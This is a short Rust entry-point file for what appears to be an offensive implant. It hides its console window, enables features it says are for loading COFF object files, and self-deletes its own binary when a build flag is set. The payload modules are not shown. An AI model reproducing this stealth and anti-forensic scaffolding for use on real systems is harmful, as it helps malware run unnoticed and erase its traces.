// Hide the console window
#![windows_subsystem = "windows"]
// Enable features for COFF loading
#![allow(internal_features)]
#![feature(c_variadic)]
#![feature(core_intrinsics)]

mod app;

fn main() {
    // Allocate a console if we're in debug mode
    app::debug::allocate_console_debug_only();

    // Self-delete the binary if the feature is enabled
    #[cfg(feature = "selfdelete")]
    if let Err(_e) = app::self_delete::perform() {
        app::debug::debug_println!("Failed to self-delete: {:?}", _e);
    };

    app::main();
}
